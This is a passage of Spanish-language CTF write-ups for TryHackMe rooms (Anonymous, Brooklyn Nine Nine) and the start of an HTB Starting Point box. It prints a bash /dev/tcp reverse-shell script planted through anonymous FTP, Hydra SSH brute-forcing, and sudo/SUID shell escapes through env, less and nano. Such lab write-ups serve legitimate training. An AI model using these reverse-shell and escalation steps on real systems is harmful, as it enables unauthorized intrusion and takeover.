clean.sh.#!/bin/bashbash -i &gt;&amp; /dev/tcp/&lt;nuestra_IP&gt;/4321 0&gt;&amp;1Iniciamos un netcat┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ nc -lvnp 4321Significado de las flags: -l : listen mode. -v : verbose. -n : solo IP numéricas, no DNS. -p : nro de puerto local.Subimos nuestro fichero modificado al ftp┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ ftp 10.10.139.26Connected to 10.10.139.26.220 NamelessOne's FTP Server!Name (10.10.139.26:ewan67): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; cd scripts250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||44503|)150 Here comes the directory listing.-rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh-rw-rw-r-- 1 1000 1000 3225 Aug 16 22:17 removed_files.log-rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt226 Directory send OK.ftp&gt; put clean.shlocal: clean.sh remote: clean.sh229 Entering Extended Passive Mode (|||58560|)150 Ok to send data.100% |*************************************************************************************************************************| 55 274.03 KiB/s 00:00 ETA226 Transfer complete.55 bytes sent in 00:00 (0.73 KiB/s)ftp&gt; Y esperamos a que se ejecute …..┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ nc -lvnp 4321listening on [any] 4321 ...connect to [10.18.xx.xx] from (UNKNOWN) [10.10.139.26] 59858bash: cannot set terminal process group (1529): Inappropriate ioctl for devicebash: no job control in this shellnamelessone@anonymous:~$ namelessone@anonymous:~$ ls -lals -latotal 60drwxr-xr-x 6 namelessone namelessone 4096 May 14 2020 .drwxr-xr-x 3 root root 4096 May 11 2020 ..lrwxrwxrwx 1 root root 9 May 11 2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 namelessone namelessone 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 namelessone namelessone 3771 Apr 4 2018 .bashrcdrwx------ 2 namelessone namelessone 4096 May 11 2020 .cachedrwx------ 3 namelessone namelessone 4096 May 11 2020 .gnupg-rw------- 1 namelessone namelessone 36 May 12 2020 .lesshstdrwxrwxr-x 3 namelessone namelessone 4096 May 12 2020 .localdrwxr-xr-x 2 namelessone namelessone 4096 May 17 2020 pics-rw-r--r-- 1 namelessone namelessone 807 Apr 4 2018 .profile-rw-rw-r-- 1 namelessone namelessone 66 May 12 2020 .selected_editor-rw-r--r-- 1 namelessone namelessone 0 May 12 2020 .sudo_as_admin_successful-rw-r--r-- 1 namelessone namelessone 33 May 11 2020 user.txt-rw------- 1 namelessone namelessone 7994 May 12 2020 .viminfo-rw-rw-r-- 1 namelessone namelessone 215 May 13 2020 .wget-hstsnamelessone@anonymous:~$ cat user.txtcat user.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxnamelessone@anonymous:~$ Bien, tenemos la flag de user. A por la de root.Escalado de privilegiosTiramos por los clásicos y buscamos enumerar binarios con el bit SUID activado.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ namelessone@anonymous:~$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;&lt; -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;-rwsr-xr-x 1 root root 40152 Oct 10 2019 /snap/core/8268/bin/mount-rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/8268/bin/ping-rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/8268/bin/ping6-rwsr-xr-x 1 root root 40128 Mar 25 2019 /snap/core/8268/bin/su-rwsr-xr-x 1 root root 27608 Oct 10 2019 /snap/core/8268/bin/umount-rwsr-xr-x 1 root root 71824 Mar 25 2019 /snap/core/8268/usr/bin/chfn-rwsr-xr-x 1 root root 40432 Mar 25 2019 /snap/core/8268/usr/bin/chsh-rwsr-xr-x 1 root root 75304 Mar 25 2019 /snap/core/8268/usr/bin/gpasswd-rwsr-xr-x 1 root root 39904 Mar 25 2019 /snap/core/8268/usr/bin/newgrp-rwsr-xr-x 1 root root 54256 Mar 25 2019 /snap/core/8268/usr/bin/passwd-rwsr-xr-x 1 root root 136808 Oct 11 2019 /snap/core/8268/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 428240 Mar 4 2019 /snap/core/8268/usr/lib/openssh/ssh-keysign-rwsr-sr-x 1 root root 106696 Dec 6 2019 /snap/core/8268/usr/lib/snapd/snap-confine-rwsr-xr-- 1 root dip 394984 Jun 12 2018 /snap/core/8268/usr/sbin/pppd-rwsr-xr-x 1 root root 40152 Jan 27 2020 /snap/core/9066/bin/mount-rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/9066/bin/ping-rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/9066/bin/ping6-rwsr-xr-x 1 root root 40128 Mar 25 2019 /snap/core/9066/bin/su-rwsr-xr-x 1 root root 27608 Jan 27 2020 /snap/core/9066/bin/umount-rwsr-xr-x 1 root root 71824 Mar 25 2019 /snap/core/9066/usr/bin/chfn-rwsr-xr-x 1 root root 40432 Mar 25 2019 /snap/core/9066/usr/bin/chsh-rwsr-xr-x 1 root root 75304 Mar 25 2019 /snap/core/9066/usr/bin/gpasswd-rwsr-xr-x 1 root root 39904 Mar 25 2019 /snap/core/9066/usr/bin/newgrp-rwsr-xr-x 1 root root 54256 Mar 25 2019 /snap/core/9066/usr/bin/passwd-rwsr-xr-x 1 root root 136808 Jan 31 2020 /snap/core/9066/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29 2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 428240 Mar 4 2019 /snap/core/9066/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 110792 Apr 10 2020 /snap/core/9066/usr/lib/snapd/snap-confine-rwsr-xr-- 1 root dip 394984 Feb 11 2020 /snap/core/9066/usr/sbin/pppd-rwsr-xr-x 1 root root 26696 Mar 5 2020 /bin/umount-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 43088 Mar 5 2020 /bin/mount-rwsr-xr-x 1 root root 44664 Mar 22 2019 /bin/su-rwsr-xr-x 1 root root 100760 Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic-rwsr-xr-- 1 root messagebus 42992 Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-sr-x 1 root root 109432 Oct 30 2019 /usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd-rwsr-xr-x 1 root root 35000 Jan 18 2018 /usr/bin/env-rwsr-xr-x 1 root root 75824 Mar 22 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newuidmap-rwsr-xr-x 1 root root 40344 Mar 22 2019 /usr/bin/newgrp-rwsr-xr-x 1 root root 44528 Mar 22 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 37136 Mar 22 2019 /usr/bin/newgidmap-rwsr-xr-x 1 root root 76496 Mar 22 2019 /usr/bin/chfn-rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo-rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-sr-x 1 daemon daemon 51464 Feb 20 2018 /usr/bin/at-rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexecTenemos /usr/bin/env  a nuestra disposición. Nos vamos a GTFOBins, buscamos por env y le damos a la cajita que pone suid.Leemos la entrada y nos quedamos con que lo que debemos ejecutar es:/usr/bin/env /bin/sh -pVamos a ello.namelessone@anonymous:~$ /usr/bin/env /bin/sh -p/usr/bin/env /bin/sh -pwhoamirootcd /rootlsroot.txtcat root.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBien, tenemos la flag de root.Hasta aquí la guía para resolver el room. Espero que os haya resultado útil.Saludos." }, { "title": "Try Hack Me - Brooklyn Nine Nine - Writeup", "url": "/posts/thm-writeup-brooklyn-nine-nine/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-08-16 02:30:00 +0100", "snippet": "En esta guía vamos a trabajar con la máquina Brooklyn Nine Nine disponible en THM, un sencillo CTF creado por Fsociety2006 en el que pondremos en práctica técnicas de enumeración, esteganografía y escalado de privilegios entre otras curiosidades.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpnIniciamos la máquina remota dando al botón  Start MachineAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/THM┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ mkdir BrooklynNineNine┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ cd BrooklynNineNine┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ echo \"Notas BrooklynNineNine\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ cat notasNotas BrooklynNineNineReconocimiento &amp; EnumeraciónEn el subtítulo del room nos comentan que hay dos vías de resolver la máquina. Puestos a practicar, en esta guía abordaremos ambas.Empezamos enumerando con nmap como punto de partida común.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ nmap -A 10.10.190.53 -oN nmap_outputSignificado de las flags: -A : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute) -oN : imprime la salida en un fichero de texto con el nombre nmap_output┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ nmap -A 10.10.190.53 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 19:13 CESTNmap scan report for 10.10.190.53Host is up (0.077s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.18.xx.xx| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)|_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.69 secondsTenemos tres puertos abiertos: 21/tcp con un servicio ftp escuchando 22/tcp con un servicio ssh escuchando 80/tcp con un servicio http escuchandoEl volcado de nmap nos cuenta que el servidor FTP soporta login anónimo. Vamos a por ello.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ ftp 10.10.190.53Connected to 10.10.190.53.220 (vsFTPd 3.0.3)Name (10.10.190.53:ewan67): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir229 Entering Extended Passive Mode (|||17845|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt226 Directory send OK.ftp&gt; get note_to_jake.txtlocal: note_to_jake.txt remote: note_to_jake.txt229 Entering Extended Passive Mode (|||50254|)150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).100% |*************************************************************************************************************************| 119 1.66 KiB/s 00:00 ETA226 Transfer complete.119 bytes received in 00:00 (1.08 KiB/s)ftp&gt; exit221 Goodbye.Abrimos el fichero que acabamos de descargarnos y nos encontramos una nota de Amy para Jake solicitándole que cambie su contraseña para que no se enfade Holt. Tres usuarios.Vamos a probar con hydra contra el servicio ssh utilizando el usuario jake y rockyou.txt como diccionario a ver si conseguimos algo. Para empezar, localizamos el diccionario en nuestro equipo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ locate rockyou.txt/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz/usr/share/wordlists/rockyou.txtY lanzamos hydra:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.190.53:22 Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-16 19:31:32[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://10.10.190.53:22/[22][ssh] host: 10.10.190.53 login: jake password: 9876543211 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-16 19:32:18Significado de las flags: -l : usuario para el que queremos encontrar la contraseña. -P : el diccionario que vamos a utilizar.Con la contraseña de jake nos logamos via ssh.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ ssh jake@10.10.190.53jake@10.10.190.53's password: Last login: Tue Aug 16 17:33:50 2022 from 10.18.34.64jake@brookly_nine_nine:~$ cd /homejake@brookly_nine_nine:/home$ ls -latotal 20drwxr-xr-x 5 root root 4096 May 18 2020 .drwxr-xr-x 24 root root 4096 May 19 2020 ..drwxr-xr-x 5 amy amy 4096 May 18 2020 amydrwxr-xr-x 6 holt holt 4096 May 26 2020 holtdrwxr-xr-x 6 jake jake 4096 May 26 2020 jakejake@brookly_nine_nine:/home$ cd amyjake@brookly_nine_nine:/home/amy$ ls -latotal 32drwxr-xr-x 5 amy amy 4096 May 18 2020 .drwxr-xr-x 5 root root 4096 May 18 2020 ..-rw-r--r-- 1 amy amy 220 May 17 2020 .bash_logout-rw-r--r-- 1 amy amy 3771 May 17 2020 .bashrcdrwx------ 2 amy amy 4096 May 18 2020 .cachedrwx------ 3 amy amy 4096 May 18 2020 .gnupg-rw-r--r-- 1 amy amy 807 May 17 2020 .profiledrwx------ 2 amy amy 4096 May 17 2020 .sshjake@brookly_nine_nine:/home/amy$ cd /home/holtjake@brookly_nine_nine:/home/holt$ ls -latotal 48drwxr-xr-x 6 holt holt 4096 May 26 2020 .drwxr-xr-x 5 root root 4096 May 18 2020 ..-rw------- 1 holt holt 18 May 26 2020 .bash_history-rw-r--r-- 1 holt holt 220 May 17 2020 .bash_logout-rw-r--r-- 1 holt holt 3771 May 17 2020 .bashrcdrwx------ 2 holt holt 4096 May 18 2020 .cachedrwx------ 3 holt holt 4096 May 18 2020 .gnupgdrwxrwxr-x 3 holt holt 4096 May 17 2020 .local-rw-r--r-- 1 holt holt 807 May 17 2020 .profiledrwx------ 2 holt holt 4096 May 18 2020 .ssh-rw------- 1 root root 110 May 18 2020 nano.save-rw-rw-r-- 1 holt holt 33 May 17 2020 user.txtjake@brookly_nine_nine:/home/holt$ cat user.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxTenemos la primer flag. Vamos a por root.Escalado de privilegiosLo primero es chequear los binarios que jake puede ejecutar con privilegios de root.[...]jake@brookly_nine_nine:/home/holt$ sudo -lMatching Defaults entries for jake on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/lessjake@brookly_nine_nine:/home/holt$Bien, podemos ejecutar el binario less con sudo sin siquiera teclear nuestra contraseña.Nos vamos a GTFOBins, buscamos por less y le damos a la cajita que pone sudo.OK. Toca probar.[...]jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).if [ \"${PS1-}\" ]; then if [ \"${BASH-}\" ] &amp;&amp; [ \"$BASH\" != \"/bin/sh\" ]; then # The file bash.bashrc already sets the default PS1. # PS1='\\h:\\w\\$ ' if [ -f /etc/bash.bashrc ]; then . /etc/bash.bashrc fi else if [ \"`id -u`\" -eq 0 ]; then PS1='# ' else PS1='$ ' fi fifiif [ -d /etc/profile.d ]; then for i in /etc/profile.d/*.sh; do if [ -r $i ]; then . $i fi done unset ifi/etc/profile (END) # aqui mismo pegamos el segundo comando !/bin/sh y damos a Enterjake@brookly_nine_nine:/home/holt$ sudo less /etc/profile# # whoamiroot# ls -latotal 48drwxr-xr-x 6 holt holt 4096 May 26 2020 .drwxr-xr-x 5 root root 4096 May 18 2020 ..-rw------- 1 holt holt 18 May 26 2020 .bash_history-rw-r--r-- 1 holt holt 220 May 17 2020 .bash_logout-rw-r--r-- 1 holt holt 3771 May 17 2020 .bashrcdrwx------ 2 holt holt 4096 May 18 2020 .cachedrwx------ 3 holt holt 4096 May 18 2020 .gnupgdrwxrwxr-x 3 holt holt 4096 May 17 2020 .local-rw-r--r-- 1 holt holt 807 May 17 2020 .profiledrwx------ 2 holt holt 4096 May 18 2020 .ssh-rw------- 1 root root 110 May 18 2020 nano.save-rw-rw-r-- 1 holt holt 33 May 17 2020 user.txt# cd /root# ls -latotal 32drwx------ 4 root root 4096 May 18 2020 .drwxr-xr-x 24 root root 4096 May 19 2020 ..-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwxr-xr-x 3 root root 4096 May 17 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 May 18 2020 .ssh-rw-r--r-- 1 root root 165 May 17 2020 .wget-hsts-rw-r--r-- 1 root root 135 May 18 2020 root.txt# cat root.txt-- Creator : Fsociety2006 --Congratulations in rooting Brooklyn Nine NineHere is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxEnjoy!!# Bien, flag de root conseguida, room resuelto. Pero como mencionamos al principio, este CTF nos propone dos vías de resolverlo. Hasta aqui hemos seguido la ruta FTP + Hydra + SSH + Escalado de privilegios. Veamos ahora qué da de si el puerto 80 que tenemos abierto.Segunda víaCargamos la IP del server en el navegador. El site nos muestra una imagen con un texto al pie. Echamos un ojo al código fuente y nos encontramos el siguiente comentario:&lt;!-- Have you ever heard of steganography? --&gt;Todo apunta a que la imagen que da vida al site tiene algo oculto mediante esteganografía.Descargamos la imagen a nuestra carpeta de trabajo y le damos cariño con steghide Tip: si intentamos descargar la imagen dando al boton derecho del ratón no veremos la opción Save Image As… pues la imagen se ha cargado via CSS. Toca abrirla en otra pestaña para poder hacerlo mediante ese método. Otra opción: wget http://10.10.190.53/brooklyn99.jpg┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ steghide --info brooklyn99.jpg\"brooklyn99.jpg\": format: jpeg capacity: 3.5 KBTry to get information about embedded data ? (y/n) yEnter passphrase: steghide: can not uncompress data. compressed data is corrupted.Malo. Nos pide una passphrase para extraer la información. Tiramos de stegcracker.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ stegcracker brooklyn99.jpgStegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)Copyright (c) 2022 - Luke Paris (Paradoxis)StegCracker has been retired following the release of StegSeek, which will blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.StegSeek can be found at: https://github.com/RickdeJager/stegseekNo wordlist was specified, using default rockyou.txt wordlist.Counting lines in wordlist..Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..Successfully cracked file with password: adminTried 20267 passwordsYour file has been written to: brooklyn99.jpg.outadminstegcracker ha hecho dos cosas: averiguar la passphrase y extraernos el fichero oculto en la imagen con el nombre brooklyn99.jpg.out en nuestro directorio de trabajo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ cat brooklyn99.jpg.outHolts Password:fluffydog12@ninenineEnjoy!!OK. Tenemos la contraseña del usuario Holt.Otra posibilidad habría sido extraerlo con steghide utilizando la passphrase que nos aportó stegcracker.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ steghide extract -sf brooklyn99.jpgEnter passphrase: wrote extracted data to \"note.txt\".┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ cat note.txtHolts Password:fluffydog12@ninenineEnjoy!!Vamos por ssh con el usuario holt.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ ssh holt@10.10.190.53 holt@10.10.190.53's password: Last login: Tue May 26 08:59:00 2020 from 10.10.10.18holt@brookly_nine_nine:~$ ls -latotal 48drwxr-xr-x 6 holt holt 4096 May 26 2020 .drwxr-xr-x 5 root root 4096 May 18 2020 ..-rw------- 1 holt holt 18 May 26 2020 .bash_history-rw-r--r-- 1 holt holt 220 May 17 2020 .bash_logout-rw-r--r-- 1 holt holt 3771 May 17 2020 .bashrcdrwx------ 2 holt holt 4096 May 18 2020 .cachedrwx------ 3 holt holt 4096 May 18 2020 .gnupgdrwxrwxr-x 3 holt holt 4096 May 17 2020 .local-rw-r--r-- 1 holt holt 807 May 17 2020 .profiledrwx------ 2 holt holt 4096 May 18 2020 .ssh-rw------- 1 root root 110 May 18 2020 nano.save-rw-rw-r-- 1 holt holt 33 May 17 2020 user.txtholt@brookly_nine_nine:~$ cat user.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxholt@brookly_nine_nine:~$ sudo -lMatching Defaults entries for holt on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser holt may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /bin/nanoholt@brookly_nine_nine:~$ En este caso, el binario que podemos explotar es nano. Volvemos a GTFOBins.Vamos a ello: ejecutamos sudo nano  en el terminal┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/BrooklynNineNine]└─$ holt@brookly_nine_nine:~$ sudo nano se nos abre el editor GNU nano 2.9.3 le damos a Ctrl + r y a continuación a Ctrl + x a continuación de Command to execute: pegamos la última parte del comando reset; sh 1&gt;&amp;0 2&gt;&amp;0  y damos a Enter nos aparece #  al final del comando anterior (somos root) tecleamos clear  + Enter. Se nos limpia el terminal y nos queda solo la almohadilla. # # whoamiroot# cd /root# ls -la total 32drwx------ 4 root root 4096 May 18 2020 .drwxr-xr-x 24 root root 4096 May 19 2020 ..-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwxr-xr-x 3 root root 4096 May 17 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 May 18 2020 .ssh-rw-r--r-- 1 root root 165 May 17 2020 .wget-hsts-rw-r--r-- 1 root root 135 May 18 2020 root.txt# cat root.txt-- Creator : Fsociety2006 --Congratulations in rooting Brooklyn Nine NineHere is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxEnjoy!!# Otra opción a lo anterior, una vez que tenemos la #  de root, es dar varias veces al Enter:Esto va en gustos.Pues hasta aquí la guía para resolver el room. Espero que os haya resultado útil.Saludos." }, { "title": "Hack The Box - Starting Point - Tier 1 - Three Writeup", "url": "/posts/htb-writeup-tier1-three/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-10 02:40:00 +0100", "snippet": "Este post forma parte de la serie Tier 1 del Starting Point de HTB que iniciamos aquí.ThreeEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.71.219, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A 10.129.71.219 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 20:39 CESTNmap scan report for 10.129.71.219Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)| 256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)|_ 256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The ToppersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.04 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputEchamos un ojo a la salida y vemos que tenemos dos puertos abiertos: 22/tcp con un servicio ssh escuchando. 80/tcp con un servicio http soportado por un Apache httpd 2.4.29.Abrimos un navegador y cargamos la IP.Trasteamos un poco con el sitio web y apuntamos la dirección de Email que aparece en la sección de Contacto: mail@thetoppers.htbAñadimos la siguiente entrada al fichero etc/hosts  de nuestro equipo para facilitarnos la faena.10.129.71.219\tthetoppers.htbLa siguiente tarea del box nos pregunta por subdominios. Toca buscarlos. Para ello localizamos un diccionario apropiado en nuestro equipo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ locate subdomains/usr/lib/python3/dist-packages/censys/asm/assets/subdomains.py/usr/lib/python3/dist-packages/censys/asm/assets/__pycache__/subdomains.cpython-310.pyc/usr/share/dnsrecon/subdomains-top1mil-20000.txt/usr/share/dnsrecon/subdomains-top1mil-5000.txt/usr/share/dnsrecon/subdomains-top1mil.txt/usr/share/metasploit-framework/data/wordlists/lync_subdomains.txt/usr/share/metasploit-framework/modules/auxiliary/gather/searchengine_subdomains_collector.rb/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt/usr/share/seclists/Discovery/DNS/combined_subdomains.txt/usr/share/seclists/Discovery/DNS/italian-subdomains.txt/usr/share/seclists/Discovery/DNS/shubs-subdomains.txt/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txtPara escanear subdominios utilizamos el modo vhost de gobuster con /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt como diccionario. VHOST mode: Este modo no debe confundirse con el modo DNS. En el modo DNS la herramienta intenta resolver por DNS los subdominios y en base a eso se nos da el resultado. En el modo vhosts la herramienta comprueba si el subdominio existe visitando la url formada y verificando la dirección IP. (fuente)┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://thetoppers.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/08/10 21:45:40 Starting gobuster in VHOST enumeration mode===============================================================Found: s3.thetoppers.htb (Status: 404) [Size: 21]Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]===============================================================2022/08/10 21:46:13 Finished===============================================================Añadimos el subdominio s3.thetoppers.htb al etc/hosts .10.129.71.219\tthetoppers.htb s3.thetoppers.htbProbamos a cargarlo en el navegador. Poca cosa.El nombre del subdominio apunta a uno de los servicios más conocidos de AWS S3. Lo que tenemos aquí es, concretamente, un bucket de S3.Toca enumerar directorios del bucket a ver qué encontramos. Buscamos diccionario para 